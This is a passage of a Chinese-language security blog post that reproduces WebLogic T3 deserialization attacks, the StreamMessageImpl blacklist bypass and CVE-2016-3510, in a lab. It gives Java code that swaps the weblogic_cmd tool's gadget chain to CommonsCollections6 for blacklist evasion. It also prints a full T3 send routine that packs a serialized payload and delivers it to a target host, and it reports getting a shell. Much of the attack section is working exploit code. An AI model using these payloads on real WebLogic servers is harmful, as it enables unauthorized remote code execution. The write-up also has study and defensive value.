src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680965011811-486e0e80-b0ac-46b7-8057-30d50f288251.png#averageHue=%232d2c2b&clientId=u1ea083eb-5723-4&from=paste&id=ud2b05a20&originHeight=325&originWidth=1330&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=74154&status=done&style=none&taskId=u6d3faa64-1e5f-4881-810f-6ea9c148400&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680965027085-dc63b2f6-fe96-41f1-8a69-aec155065d73.png#averageHue=%232c2c2b&clientId=u1ea083eb-5723-4&from=paste&id=u89a4fd0e&originHeight=409&originWidth=1288&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=70209&status=done&style=none&taskId=u6e9dd077-1a6d-4cb7-8e9e-52f2459ec46&title=" alt="image.png"><br>最后是在一个Chunk中的，所以我们只需要生成payload的时候丢进去即可</p>
<h2 id="填坑"><a href="#填坑" class="headerlink" title="填坑"></a>填坑</h2><p>网上并没有说明这个问题捏，浪费我2个小时，我草了<br>破案了，破大案了，不是说找不到类吗，结果一搜发现一个问题<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681007651141-d4264ab8-4cef-42d4-a347-cd6462790144.png#averageHue=%23cccbcb&clientId=u28268f5a-430b-4&from=paste&height=613&id=uec4ee307&originHeight=766&originWidth=1770&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102188&status=done&style=none&taskId=u00aec5e0-bff4-46d7-8a4f-06e0f8244eb&title=&width=1416" alt="image.png"><br>就是咱们的<code>StreamMessageImpl</code>类是需要我们手动创建出来的。。。否则找不着，按照他说的创建一下<br><code> java -jar ../../../modules/com.bea.core.jarbuilder_X.X.X.X.jar</code><br><code>/java/bin/java -jar ../../../modules/com.bea.core.jarbuilder_1.7.0.0.jar</code><br>在运行上述指令前，你需要进入<code>wlserver/server/lib</code>目录，否则会报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008205648-d441c91e-312c-457b-9dbd-1884047746a2.png#averageHue=%23fefdfb&clientId=u28268f5a-430b-4&from=paste&height=170&id=u6e58ce28&originHeight=212&originWidth=961&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20305&status=done&style=none&taskId=u6cf6e2df-708a-40f2-add8-88c8f6ed524&title=&width=768.8" alt="image.png"><br>然后运行之后就可以得到jar包拉，我们想调试的话需要把这个jar包加入依赖<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008232706-f6883657-8e83-4f5b-a129-0cc1edbca8fc.png#averageHue=%23dab37d&clientId=u28268f5a-430b-4&from=paste&height=82&id=u8b82948a&originHeight=102&originWidth=883&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18137&status=done&style=none&taskId=u3efcc485-c267-413c-9f19-299c4df3f7b&title=&width=706.4" alt="image.png"></p>
<h2 id="漏洞复现？漏洞复现！"><a href="#漏洞复现？漏洞复现！" class="headerlink" title="漏洞复现？漏洞复现！"></a>漏洞复现？漏洞复现！</h2><p>这里使用开源工具<a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a><br>下载下来，然后JDK版本要求是1.6，配置一下，如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680968132140-efb21187-64cb-481f-82e0-8cb98f449db6.png#averageHue=%232c2f33&clientId=u1ea083eb-5723-4&from=paste&height=695&id=u0d0619f1&originHeight=869&originWidth=1322&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140939&status=done&style=none&taskId=u7aa33ede-e267-48bf-ac35-ad5049ab8da&title=&width=1057.6" alt="image.png"><br>直接发射，即可执行命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680968145287-6731b06f-9ee8-4196-803f-3628c84c62bc.png#averageHue=%23eec98d&clientId=u1ea083eb-5723-4&from=paste&height=315&id=u21724ca1&originHeight=394&originWidth=1264&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61388&status=done&style=none&taskId=u2cb0d538-eb9b-4116-a533-55a64d0cc3c&title=&width=1011.2" alt="image.png"><br>但是我这里报了个这个错误，这是因为我上述环境没有配置好的原因Orz，由于我的jdk用的是8u202所以CC1是打不通的！<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680968276063-b6c5750d-7a5c-4a8b-bc55-befd45741ac9.png#averageHue=%232b2d29&clientId=u1ea083eb-5723-4&from=paste&height=539&id=u3e24b066&originHeight=674&originWidth=1727&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1692126&status=done&style=none&taskId=u00ea8bd6-d64a-47b4-bdda-edb94b61090&title=&width=1381.6" alt="image.png"><br>该工具生成payload的地方如上，采用完整CC1流程，那我就想魔改一下改成CC6，那样就可以和CVE2015一样成功执行了</p>
<blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> 4.8 好累啊今天呜呜呜，歇一下明天再搞吧</li>
<li><input checked="" disabled="" type="checkbox"> 4.9 改完了，起床了，EZEZ</li>
</ul>
</blockquote>
<p>魔改为CC6其实很简单，因为这个工具的分离其实做的不错，嵌合度没有太高，我们可以很轻松的改链子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialData(Transformer[] transformers) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">// 初始化map 设置laymap</span></span><br><span class="line">    Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(innerMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//随便改成什么Transformer</span></span><br><span class="line">    TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">    innerMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    factory.set(lazymap,transformerChain);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">_handler</span> <span class="operator">=</span> BypassPayloadSelector.selectBypass(hashMap);</span><br><span class="line">    <span class="keyword">return</span> Serializables.serialize(_handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将生成payload的地方改为我设置的即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008373834-fc677727-abfe-4eb0-be4e-cc7d608ac02e.png#averageHue=%23171412&clientId=u28268f5a-430b-4&from=paste&height=165&id=udfecc8c4&originHeight=206&originWidth=978&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22688&status=done&style=none&taskId=ub4ed1bea-20e9-49e0-8ea8-7421daa680e&title=&width=782.4" alt="image.png"><br>getshell！</p>
<h2 id="EXP流程分析"><a href="#EXP流程分析" class="headerlink" title="EXP流程分析"></a>EXP流程分析</h2><p>漏洞原理就和一开始一样，我们看看是怎么生成payload的，开启debug模式给断点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008566450-47b1529e-8aed-491b-9a12-d750824fcb5b.png#averageHue=%232f322d&clientId=u28268f5a-430b-4&from=paste&height=601&id=ubfe36c07&originHeight=751&originWidth=1484&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1587289&status=done&style=none&taskId=u50a550f9-1321-4983-b334-a16d329e914&title=&width=1187.2" alt="image.png"><br>首先进行一系列的初始化，并判断我们传入的参数，随之进入executebind方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008590091-bda1c4a6-fa4d-4d15-9387-3092cf9865d3.png#averageHue=%232a2c29&clientId=u28268f5a-430b-4&from=paste&height=582&id=u2101e858&originHeight=727&originWidth=1340&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1361296&status=done&style=none&taskId=uca9f489c-7738-44ee-bc10-0dfbcdd7c59&title=&width=1072" alt="image.png"><br>接下来获取参数中的B和C，必须要有这两个才能进行下一步<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008630091-64a1abc1-c757-49c7-a495-8805a64af22f.png#averageHue=%232a2c29&clientId=u28268f5a-430b-4&from=paste&height=545&id=u362cd558&originHeight=681&originWidth=1448&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1372681&status=done&style=none&taskId=ub131da94-b9ba-4278-a194-1837c23b9a0&title=&width=1158.4" alt="image.png"><br>进入bindExecute方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008659216-f3d50aec-8442-48ae-9b93-81985bfe444b.png#averageHue=%232b2d2b&clientId=u28268f5a-430b-4&from=paste&height=653&id=u5be891b5&originHeight=816&originWidth=1527&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1713760&status=done&style=none&taskId=u43d2a0a5-3d35-45d2-a9d0-4e8d9c98840&title=&width=1221.6" alt="image.png"><br>判断系统是Linux还是windows，这里是Linux，随后进入生成payload的函数<code>SerialDataGenerator.serialBlindDatas</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008690463-a47209f1-6afb-4cac-9058-112d8408a1b3.png#averageHue=%23292a26&clientId=u28268f5a-430b-4&from=paste&height=129&id=u9f1ae94c&originHeight=161&originWidth=1010&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=231111&status=done&style=none&taskId=u00741cfe-f177-4bf0-9e74-7449ff8cd6d&title=&width=808" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008699949-d6212b14-d3f3-4181-a048-fd4a59f2f1d3.png#averageHue=%232c2c28&clientId=u28268f5a-430b-4&from=paste&height=334&id=u7fdd97be&originHeight=418&originWidth=1284&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=789115&status=done&style=none&taskId=u3fd539a5-fbc2-49c1-94be-d29404a72de&title=&width=1027.2" alt="image.png"><br>这里是生成CC链里的chaintransformer的地方，生成完后退回<code>serialBlindDatas</code>，进入<code>serialData</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008739988-4b99868c-d38c-4dbe-935a-649810a34fd4.png#averageHue=%23292b28&clientId=u28268f5a-430b-4&from=paste&height=443&id=u4fed342f&originHeight=554&originWidth=1344&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1036655&status=done&style=none&taskId=uf904a16c-7342-4ab7-b23f-c46efc7385b&title=&width=1075.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008745777-69be7af1-8aa2-452e-96c1-ecb950c5f9c9.png#averageHue=%232b2d29&clientId=u28268f5a-430b-4&from=paste&height=466&id=ue69510a6&originHeight=582&originWidth=1337&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1145787&status=done&style=none&taskId=u05a2fff8-ce9b-420b-bca7-d2dcff32a50&title=&width=1069.6" alt="image.png"><br>这里就是我们魔改的地方了，改为CC6，在最后之前会判断一下bypass，因为有2种方式可以绕过黑名单，这是第一种<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008782720-a40da91b-e5be-4264-a44e-96d9ab3e39f8.png#averageHue=%232e2e2b&clientId=u28268f5a-430b-4&from=paste&height=146&id=ua4f2181c&originHeight=183&originWidth=1254&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=322499&status=done&style=none&taskId=ue76864cd-b513-4ce6-8b50-eee1cc3da7b&title=&width=1003.2" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008788255-861a9287-833f-482d-adc5-5dcfa9209922.png#averageHue=%232c2c28&clientId=u28268f5a-430b-4&from=paste&height=219&id=u30a37eae&originHeight=274&originWidth=1154&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=465914&status=done&style=none&taskId=udbb4b94f-eac7-41aa-bb1b-eb90e063c43&title=&width=923.2" alt="image.png"><br>咱们这里的方法为<code>streamMessageImpl</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008802966-7dffca94-d0ec-4aab-a47b-81ed84d7c99a.png#averageHue=%23292b28&clientId=u28268f5a-430b-4&from=paste&height=502&id=u515af065&originHeight=628&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1209598&status=done&style=none&taskId=u9ccaf96c-b549-460d-a43b-db835b87867&title=&width=1122.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008826197-14a0bdcf-943c-4cf0-a101-1f48a68e7757.png#averageHue=%232a2b28&clientId=u28268f5a-430b-4&from=paste&height=227&id=uf4ce7a2c&originHeight=284&originWidth=1354&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=524098&status=done&style=none&taskId=u18658a12-f718-4338-96e5-5beda8f484a&title=&width=1083.2" alt="image.png"><br>最外层的壳为streamMessageImpl了，至此payload生成结束，随后就是序列化并发往服务端<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681008877246-c0a1b4be-ab62-47ca-a3ef-739f5b062e5e.png#averageHue=%232b2b27&clientId=u28268f5a-430b-4&from=paste&height=191&id=ud7c36902&originHeight=239&originWidth=1407&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=465037&status=done&style=none&taskId=uf12f487f-527a-4d37-81e8-d67aba50674&title=&width=1125.6" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(String host, String port, <span class="type">byte</span>[] payload)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> SocketFactory.newSocket(host, Integer.parseInt(port));</span><br><span class="line">        <span class="comment">//AS ABBREV_TABLE_SIZE HL remoteHeaderLength 用来做skip的</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> <span class="string">&quot;t3 7.0.0.0\nAS:10\nHL:19\n\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Main.cmdLine.hasOption(<span class="string">&quot;https&quot;</span>)) &#123;</span><br><span class="line">            header = <span class="string">&quot;t3s 7.0.0.0\nAS:10\nHL:19\n\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        s.getOutputStream().write(header.getBytes());</span><br><span class="line">        s.getOutputStream().flush();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(s.getInputStream()));</span><br><span class="line">        <span class="type">String</span> <span class="variable">versionInfo</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">        <span class="keyword">if</span> (Main.version == <span class="literal">null</span>) &#123;</span><br><span class="line">            versionInfo = versionInfo.replace(<span class="string">&quot;HELO:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            versionInfo = versionInfo.replace(<span class="string">&quot;.false&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;weblogic version:&quot;</span> + versionInfo);</span><br><span class="line">            Main.version = versionInfo;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        String asInfo = br.readLine();</span></span><br><span class="line"><span class="comment">//        String hlInfo = br.readLine();</span></span><br><span class="line"><span class="comment">//        System.out.println(versionInfo+&quot;\n&quot;+asInfo+&quot;\n&quot;+hlInfo);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//cmd=1,QOS=1,flags=1,responseId=4,invokableId=4,abbrevOffset=4,countLength=1,capacityLength=1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//t3 protocol</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;08&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">qos</span> <span class="operator">=</span> <span class="string">&quot;65&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flags</span> <span class="operator">=</span> <span class="string">&quot;01&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">responseId</span> <span class="operator">=</span> <span class="string">&quot;ffffffff&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">invokableId</span> <span class="operator">=</span> <span class="string">&quot;ffffffff&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">abbrevOffset</span> <span class="operator">=</span> <span class="string">&quot;00000000&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">countLength</span> <span class="operator">=</span> <span class="string">&quot;01&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">capacityLength</span> <span class="operator">=</span> <span class="string">&quot;10&quot;</span>;<span class="comment">//必须大于上面设置的AS值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">readObjectType</span> <span class="operator">=</span> <span class="string">&quot;00&quot;</span>;<span class="comment">//00 object deserial 01 ascii</span></span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">datas</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        datas.append(cmd);</span><br><span class="line">        datas.append(qos);</span><br><span class="line">        datas.append(flags);</span><br><span class="line">        datas.append(responseId);</span><br><span class="line">        datas.append(invokableId);</span><br><span class="line">        datas.append(abbrevOffset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//because of 2 times deserial</span></span><br><span class="line">        countLength = <span class="string">&quot;04&quot;</span>;</span><br><span class="line">        datas.append(countLength);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//define execute operation</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">pahse1Str</span> <span class="operator">=</span> BytesOperation.bytesToHexString(payload);</span><br><span class="line">        datas.append(capacityLength);</span><br><span class="line">        datas.append(readObjectType);</span><br><span class="line">        datas.append(pahse1Str);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//for compatiable fo hide</span></span><br><span class="line">        <span class="comment">//for compatiable fo hide</span></span><br><span class="line">        <span class="type">AuthenticatedUser</span> <span class="variable">authenticatedUser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AuthenticatedUser</span>(<span class="string">&quot;weblogic&quot;</span>, <span class="string">&quot;admin123&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">phase4</span> <span class="operator">=</span> BytesOperation.bytesToHexString(Serializables.serialize(authenticatedUser));</span><br><span class="line">        datas.append(capacityLength);</span><br><span class="line">        datas.append(readObjectType);</span><br><span class="line">        datas.append(phase4);</span><br><span class="line"></span><br><span class="line">        <span class="type">JVMID</span> <span class="variable">src</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JVMID</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,<span class="type">boolean</span>.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        src = (JVMID)constructor.newInstance(InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>),<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">serverName</span> <span class="operator">=</span> src.getClass().getDeclaredField(<span class="string">&quot;differentiator&quot;</span>);</span><br><span class="line">        serverName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        serverName.set(src,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        datas.append(capacityLength);</span><br><span class="line">        datas.append(readObjectType);</span><br><span class="line">        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(src)));</span><br><span class="line"></span><br><span class="line">        <span class="type">JVMID</span> <span class="variable">dst</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JVMID</span>();</span><br><span class="line"></span><br><span class="line">        constructor = JVMID.class.getDeclaredConstructor(java.net.InetAddress.class,<span class="type">boolean</span>.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        src = (JVMID)constructor.newInstance(InetAddress.getByName(<span class="string">&quot;127.0.0.1&quot;</span>),<span class="literal">false</span>);</span><br><span class="line">        serverName = src.getClass().getDeclaredField(<span class="string">&quot;differentiator&quot;</span>);</span><br><span class="line">        serverName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        serverName.set(dst,<span class="number">1</span>);</span><br><span class="line">        datas.append(capacityLength);</span><br><span class="line">        datas.append(readObjectType);</span><br><span class="line">        datas.append(BytesOperation.bytesToHexString(Serializables.serialize(dst)));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] headers = BytesOperation.hexStringToBytes(datas.toString());</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> headers.length + <span class="number">4</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hexLen</span> <span class="operator">=</span> Integer.toHexString(len);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">dataLen</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hexLen.length() &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; (<span class="number">8</span> - hexLen.length()); i++) &#123;</span><br><span class="line">                dataLen.append(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dataLen.append(hexLen);</span><br><span class="line">        s.getOutputStream().write(BytesOperation.hexStringToBytes(dataLen + datas.toString()));</span><br><span class="line">        s.getOutputStream().flush();</span><br><span class="line">        s.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接用代码来展示了，这其实做的就是当时py脚本做的事情，由于java太臭了所以显得很长</p>
<h1 id="CVE-2016-3510（另一种绕过"><a href="#CVE-2016-3510（另一种绕过" class="headerlink" title="CVE-2016-3510（另一种绕过)"></a>CVE-2016-3510（另一种绕过)</h1><h2 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h2><p>Weblogic1036、JDK8U202</p>
<h2 id="漏洞概况-1"><a href="#漏洞概况-1" class="headerlink" title="漏洞概况"></a>漏洞概况</h2><p>之前不是用的StreamMessageImpl二次反序列化嘛，但是我们需要关注一件事情</p>
<blockquote>
<p>在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法</p>
</blockquote>
<p>这个需要注意呀，上面是在readExternal，而这次dalao们找到的类是<code>MarshalledObject (weblogic.corba.utils)</code>中的readResolve方法</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>很简单只需改一下上面payload中的类型：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681009096935-80060e50-77c6-44ab-a03b-293c9711ccab.png#averageHue=%232c2d28&clientId=u28268f5a-430b-4&from=paste&height=372&id=ueede732f&originHeight=465&originWidth=1230&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=788364&status=done&style=none&taskId=u7e217842-76c8-443a-b624-79c47ecac27&title=&width=984" alt="image.png"><br>之后也是直接发射<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681009136774-72500d9b-7285-4744-ae39-e61d7407c64e.png#averageHue=%23242222&clientId=u28268f5a-430b-4&from=paste&height=214&id=u33dc2de2&originHeight=267&originWidth=982&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20765&status=done&style=none&taskId=u260de273-2336-43bb-a998-71590306e36&title=&width=785.6" alt="image.png"><br>直接getshell，接下里分析一下漏洞的触发链，EXP生成过程就不说了，和上面一模一样，只是外面的皮不一样了</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点位于<code>MarshalledObject#readResolve</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681009205640-9ff638dd-135e-481b-bbff-10577468b32d.png#averageHue=%232a2b27&clientId=u28268f5a-430b-4&from=paste&height=285&id=u38c7f09d&originHeight=356&originWidth=1319&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=648505&status=done&style=none&taskId=u784885e6-d1be-4c40-86ff-6e5b86f1aea&title=&width=1055.2" alt="image.png"><br>在这里对变量var2进行了二次反序列化，和上面一样，那我们看看var2是怎么来的，可以看到最终来自<code>this.objBytes</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681009281482-6a0643ee-f6ff-4a37-892b-792bbe06864e.png#averageHue=%232a2b27&clientId=u28268f5a-430b-4&from=paste&height=398&id=u6e11f7e4&originHeight=498&originWidth=1175&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=834724&status=done&style=none&taskId=udee1f67f-c89f-46a4-b151-1e0e2e53d32&title=&width=940" alt="image.png"><br>在初始化的过程中就已经给他赋值了，所以也是和SteamMessageImpl一样的生成方式拉<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681009324074-11fcd44d-5c99-4ebe-aa08-ee14152f2725.png#averageHue=%232c2d29&clientId=u28268f5a-430b-4&from=paste&height=290&id=u34773f1a&originHeight=363&originWidth=1132&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=582948&status=done&style=none&taskId=u6d890260-b1bc-4cc3-bb45-8f4589ef36b&title=&width=905.6" alt="image.png"><br>我也重新debug了一下，发现确实是如此</p>
<h1 id="骚姿势来回显命令执行结果"><a href="#骚姿势来回显命令执行结果" class="headerlink" title="骚姿势来回显命令执行结果"></a>骚姿势来回显命令执行结果</h1><p>这篇文章介绍了如何处理webloigc无回显的命令执行的问题，假如不出网的话可以用这种方法<br>这个师傅文章写的很好，介绍了几种冷门回显</p>
<h1 id="RMI反序列化获得回显"><a href="#RMI反序列化获得回显" class="headerlink" title="RMI反序列化获得回显"></a>RMI反序列化获得回显</h1><h2 id="环境-2"><a href="#环境-2" class="headerlink" title="环境"></a>环境</h2><p>Weblogic1036、JDK8U202</p>
